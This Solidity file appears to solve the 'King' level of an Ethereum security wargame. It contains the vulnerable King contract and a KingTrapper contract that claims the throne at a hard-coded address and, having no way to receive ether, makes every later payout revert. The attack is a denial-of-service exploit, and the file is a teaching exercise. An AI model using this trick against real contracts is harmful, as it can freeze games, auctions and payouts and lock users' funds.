// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract KingTrapper {
    King instance = King(payable(0x41cF6F5987db828810935789be53a99267754926));

    constructor() payable {
        (bool success, ) = address(instance).call{value: msg.value}("");
        require(success, "KingTrapper: Failed to transfer.");
    }
}
